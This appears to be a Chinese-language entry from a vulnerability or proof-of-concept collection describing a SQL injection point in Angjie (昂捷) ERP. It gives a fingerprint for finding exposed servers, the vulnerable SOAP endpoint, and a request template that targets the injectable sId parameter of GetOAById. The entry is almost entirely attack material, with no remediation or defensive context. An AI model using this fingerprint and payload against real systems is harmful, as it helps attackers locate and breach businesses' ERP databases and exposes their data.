# 昂捷ERPSQL注入点2

昂捷ERPSQL注入点 ｜ SQL注入 ｜ —
- **指纹**：`body="CheckSilverlightInstalled"`
- **请求**：`POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1`

**Payload**
```
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetOAById>
<!--type: string-->
<tem:sId>gero et</tem:sId>
</tem:GetOAById>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200